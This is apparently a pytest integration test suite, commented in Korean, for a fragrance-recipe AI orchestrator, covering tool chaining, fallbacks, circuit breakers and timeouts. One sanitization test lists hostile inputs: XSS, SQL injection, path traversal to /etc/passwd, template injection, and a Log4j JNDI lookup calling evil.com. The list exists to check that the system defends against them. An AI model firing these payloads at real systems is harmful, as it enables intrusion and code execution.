"""
포괄적인 오케스트레이터 통합 테스트
실제 시나리오에서의 도구 연속 호출, 조건부 분기, 에러 복구 등을 검증
"""

import pytest
import asyncio
from unittest.mock import Mock, patch, AsyncMock
from datetime import datetime
import json
from typing import Dict, Any, List

from fragrance_ai.orchestrator.artisan_orchestrator import (
    ArtisanOrchestrator,
    ConversationContext,
    ArtisanResponse,
    ToolExecutionResult,
    ToolStatus
)


class TestOrchestratorScenarios:
    """실제 사용 시나리오 기반 통합 테스트"""

    @pytest.fixture
    async def orchestrator(self):
        """테스트용 오케스트레이터 설정"""
        orchestrator = ArtisanOrchestrator()

        # 모든 외부 의존성을 모의 객체로 대체
        orchestrator.ollama_client = AsyncMock()
        orchestrator.conductor_llm = AsyncMock()

        return orchestrator

    @pytest.fixture
    def conversation_context(self):
        """테스트용 대화 컨텍스트"""
        return ConversationContext(
            user_id="test_user",
            conversation_id="test_conversation",
            history=[]
        )

    @pytest.mark.asyncio
    async def test_complete_perfume_creation_flow(self, orchestrator, conversation_context):
        """
        시나리오: 사용자가 향수 생성 요청 → 검색 → 생성 → 검증 → 응답
        """
        # 사용자 요청
        user_message = "여름에 어울리는 상큼한 시트러스 향수를 만들어주세요"

        # 도구 모의 설정
        async def mock_search(*args, **kwargs):
            return {
                "results": [
                    {"name": "Summer Citrus", "notes": ["레몬", "라임", "베르가못"]},
                    {"name": "Fresh Morning", "notes": ["오렌지", "자몽", "민트"]}
                ]
            }

        async def mock_generate(*args, **kwargs):
            return {
                "name": "Citrus Summer Dream",
                "top_notes": [{"name": "베르가못", "percentage": 25}],
                "heart_notes": [{"name": "네롤리", "percentage": 35}],
                "base_notes": [{"name": "화이트 머스크", "percentage": 20}],
                "character": "Fresh & Energetic",
                "longevity": "4-6 hours",
                "description": "여름의 상쾌함을 담은 시트러스 향수"
            }

        async def mock_validate(*args, **kwargs):
            return {
                "valid": True,
                "score": 9.2,
                "feedback": "균형잡힌 조합입니다",
                "suggestions": ["베이스 노트를 조금 더 강화하면 좋을 것 같습니다"]
            }

        # 도구 주입
        orchestrator.tools["hybrid_search"] = mock_search
        orchestrator.tools["recipe_generator"] = mock_generate
        orchestrator.tools["scientific_validator"] = mock_validate

        # LLM 응답 설정
        orchestrator.ollama_client.generate = AsyncMock(
            side_effect=[
                json.dumps({
                    "tools": ["hybrid_search", "recipe_generator", "scientific_validator"],
                    "reasoning": "시트러스 향수 생성 프로세스"
                })
            ]
        )

        # 실행
        response = await orchestrator.process_message(user_message, conversation_context)

        # 검증
        assert response is not None
        assert isinstance(response, ArtisanResponse)
        assert response.message is not None
        assert "시트러스" in response.message or "Citrus" in response.message
        assert response.recipe_summary is not None
        assert response.recipe_summary.get("name") == "Citrus Summer Dream"
        assert len(conversation_context.history) > 0

    @pytest.mark.asyncio
    async def test_tool_failure_with_graceful_recovery(self, orchestrator, conversation_context):
        """
        시나리오: 일부 도구 실패 시 대체 도구로 우아한 복구
        """
        user_message = "로맨틱한 플로럴 향수를 추천해주세요"

        # 메인 검색 도구는 실패
        async def failing_search(*args, **kwargs):
            raise ConnectionError("Database connection failed")

        # 폴백 검색은 성공
        async def fallback_search(*args, **kwargs):
            return {
                "results": [{"name": "Romantic Rose", "cached": True}],
                "method": "cache_fallback"
            }

        orchestrator.tools["hybrid_search"] = failing_search
        orchestrator._execute_fallback = AsyncMock(
            return_value=ToolExecutionResult(
                tool="hybrid_search",
                status=ToolStatus.PARTIAL,
                result={"results": [{"name": "Romantic Rose"}], "cached": True},
                fallback_used=True
            )
        )

        # 생성 도구는 정상 작동
        async def mock_generate(*args, **kwargs):
            return {
                "name": "Romantic Floral Dream",
                "description": "로맨틱한 플로럴 향수"
            }

        orchestrator.tools["recipe_generator"] = mock_generate

        # 실행
        response = await orchestrator.process_message(user_message, conversation_context)

        # 검증: 일부 도구 실패에도 불구하고 응답 생성
        assert response is not None
        assert response.message is not None
        assert "죄송" not in response.message  # 에러 메시지가 아님
        assert response.recipe_summary is not None or "추천" in response.message

    @pytest.mark.asyncio
    async def test_conditional_tool_execution_based_on_intent(self, orchestrator, conversation_context):
        """
        시나리오: 사용자 의도에 따른 조건부 도구 실행
        """
        test_cases = [
            {
                "message": "향수를 만들어주세요",
                "expected_tools": ["hybrid_search", "recipe_generator", "scientific_validator"],
                "intent": "create_perfume"
            },
            {
                "message": "플로럴 계열 향수를 검색해주세요",
                "expected_tools": ["hybrid_search"],
                "intent": "search_perfume"
            },
            {
                "message": "네롤리 노트에 대해 알려주세요",
                "expected_tools": ["perfumer_knowledge"],
                "intent": "knowledge_query"
            }
        ]

        for test_case in test_cases:
            executed_tools = []

            # 도구 실행 추적
            async def track_tool_execution(tool_name):
                async def tool_func(*args, **kwargs):
                    executed_tools.append(tool_name)
                    return {"result": f"Result from {tool_name}"}
                return tool_func

            # 모든 도구에 추적 함수 설정
            for tool_name in ["hybrid_search", "recipe_generator", "scientific_validator", "perfumer_knowledge"]:
                orchestrator.tools[tool_name] = await track_tool_execution(tool_name)

            # 의도 분석 모의
            orchestrator._analyze_intent = AsyncMock(
                return_value={
                    "type": test_case["intent"],
                    "confidence": 0.95,
                    "entities": {}
                }
            )

            # 실행
            await orchestrator.process_message(test_case["message"], conversation_context)

            # 검증: 의도에 맞는 도구만 실행됨
            for expected_tool in test_case["expected_tools"]:
                assert expected_tool in executed_tools, \
                    f"Expected tool {expected_tool} not executed for intent {test_case['intent']}"

            executed_tools.clear()

    @pytest.mark.asyncio
    async def test_parallel_tool_execution_performance(self, orchestrator):
        """
        시나리오: 병렬 실행 가능한 도구들의 동시 처리 성능 테스트
        """
        execution_times = []

        async def slow_tool(delay):
            async def tool_func(*args, **kwargs):
                start = datetime.utcnow()
                await asyncio.sleep(delay)
                execution_times.append({
                    "start": start,
                    "end": datetime.utcnow(),
                    "duration": delay
                })
                return {"result": f"Completed after {delay}s"}
            return tool_func

        # 3개의 병렬 도구 (각각 1초 소요)
        orchestrator.tools["tool_1"] = await slow_tool(1.0)
        orchestrator.tools["tool_2"] = await slow_tool(1.0)
        orchestrator.tools["tool_3"] = await slow_tool(1.0)

        # 병렬 실행 계획
        plan = [
            {"tool": "tool_1", "params": {}, "parallel": True},
            {"tool": "tool_2", "params": {}, "parallel": True},
            {"tool": "tool_3", "params": {}, "parallel": True}
        ]

        start_time = datetime.utcnow()
        results = await orchestrator._execute_tools(plan)
        end_time = datetime.utcnow()

        total_duration = (end_time - start_time).total_seconds()

        # 검증: 병렬 실행으로 3초가 아닌 약 1초에 완료
        assert total_duration < 2.0, f"Parallel execution took {total_duration}s, expected < 2s"
        assert len(results) == 3
        assert all(r.status == ToolStatus.SUCCESS for r in results)

    @pytest.mark.asyncio
    async def test_complex_conversation_with_context_preservation(self, orchestrator, conversation_context):
        """
        시나리오: 여러 턴의 대화에서 컨텍스트 유지 및 활용
        """
        conversations = [
            {
                "user": "플로럴 계열 향수를 만들고 싶어요",
                "expected_context": "floral"
            },
            {
                "user": "거기에 우디한 느낌도 추가해주세요",
                "expected_context": "floral_woody"
            },
            {
                "user": "마지막으로 머스크를 넣어주세요",
                "expected_context": "floral_woody_musk"
            }
        ]

        for i, conv in enumerate(conversations):
            # 이전 대화 참조 확인
            if i > 0:
                assert len(conversation_context.history) > 0
                last_message = conversation_context.history[-1]
                assert last_message["user"] == conversations[i-1]["user"]

            # 도구 설정
            async def context_aware_generator(*args, **kwargs):
                # 컨텍스트를 반영한 생성
                if len(conversation_context.history) == 0:
                    return {"name": "Floral Dream", "base": "floral"}
                elif len(conversation_context.history) == 2:
                    return {"name": "Floral Woods", "base": "floral_woody"}
                else:
                    return {"name": "Complete Harmony", "base": "floral_woody_musk"}

            orchestrator.tools["recipe_generator"] = context_aware_generator

            # 실행
            response = await orchestrator.process_message(conv["user"], conversation_context)

            # 검증
            assert response is not None
            assert response.recipe_summary is not None or conv["expected_context"] in str(response.message).lower()

    @pytest.mark.asyncio
    async def test_circuit_breaker_prevents_cascading_failures(self, orchestrator):
        """
        시나리오: Circuit Breaker가 연쇄 장애를 방지
        """
        failure_count = 0

        async def always_failing_tool(*args, **kwargs):
            nonlocal failure_count
            failure_count += 1
            raise Exception("Service unavailable")

        orchestrator.tools["hybrid_search"] = always_failing_tool
        orchestrator.max_retries = 2

        # 5번 연속 호출 시도
        for i in range(5):
            plan = [{"tool": "hybrid_search", "params": {}}]
            await orchestrator._execute_tools(plan)

        # 검증: Circuit Breaker가 작동하여 실제 호출 횟수 제한
        assert failure_count <= 6  # 초기 시도 + 재시도 횟수

        # Circuit Breaker 상태 확인
        breaker = orchestrator.circuit_breakers.get("hybrid_search")
        assert breaker is not None
        assert breaker.is_open is True

    @pytest.mark.asyncio
    async def test_timeout_handling_in_long_running_operations(self, orchestrator):
        """
        시나리오: 장시간 실행 작업의 타임아웃 처리
        """
        async def long_running_tool(*args, **kwargs):
            await asyncio.sleep(10)  # 10초 대기
            return {"result": "Should not reach here"}

        orchestrator.tools["slow_tool"] = long_running_tool
        orchestrator.timeout_seconds = 1  # 1초 타임아웃

        plan = [{"tool": "slow_tool", "params": {}}]

        start_time = datetime.utcnow()
        results = await orchestrator._execute_tools(plan)
        end_time = datetime.utcnow()

        duration = (end_time - start_time).total_seconds()

        # 검증: 타임아웃이 적용되어 1초 근처에서 종료
        assert duration < 2.0
        assert len(results) == 1
        assert results[0].status in [ToolStatus.TIMEOUT, ToolStatus.FAILED]

    @pytest.mark.asyncio
    async def test_data_validation_and_sanitization(self, orchestrator, conversation_context):
        """
        시나리오: 입력 데이터 검증 및 악의적 입력 방어
        """
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}"  # Log4j style
        ]

        for malicious_input in malicious_inputs:
            # 실행
            response = await orchestrator.process_message(malicious_input, conversation_context)

            # 검증: 악의적 입력이 그대로 실행되지 않음
            assert response is not None
            assert "<script>" not in response.message
            assert "DROP TABLE" not in response.message
            assert "../" not in response.message
            assert "{{" not in response.message
            assert "${" not in response.message

    @pytest.mark.asyncio
    async def test_memory_efficient_batch_processing(self, orchestrator):
        """
        시나리오: 대량 요청의 메모리 효율적 처리
        """
        batch_size = 100
        results = []

        # 메모리 사용량 추적
        import gc
        gc.collect()

        for i in range(batch_size):
            # 간단한 도구 실행
            plan = [{"tool": "hybrid_search", "params": {"query": f"test_{i}"}}]

            orchestrator.tools["hybrid_search"] = AsyncMock(
                return_value={"results": [f"result_{i}"]}
            )

            result = await orchestrator._execute_tools(plan)
            results.append(result)

            # 주기적인 가비지 컬렉션
            if i % 10 == 0:
                gc.collect()

        # 검증: 모든 요청 성공적으로 처리
        assert len(results) == batch_size
        assert all(len(r) > 0 for r in results)


class TestOrchestratorIntegrationWithRealDependencies:
    """실제 의존성과의 통합 테스트 (선택적)"""

    @pytest.mark.integration
    @pytest.mark.skipif(
        not pytest.config.getoption("--run-integration"),
        reason="Integration tests require --run-integration flag"
    )
    async def test_real_ollama_integration(self):
        """
        실제 Ollama 서비스와의 통합 테스트
        주의: 이 테스트는 실제 Ollama 서비스가 실행 중이어야 함
        """
        orchestrator = ArtisanOrchestrator()

        # 실제 Ollama 연결 테스트
        if hasattr(orchestrator, 'ollama_client'):
            is_available = await orchestrator.ollama_client.check_availability()

            if is_available:
                response = await orchestrator.ollama_client.generate(
                    "Create a simple perfume recipe"
                )
                assert response is not None
                assert len(response) > 0
            else:
                pytest.skip("Ollama service not available")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--asyncio-mode=auto"])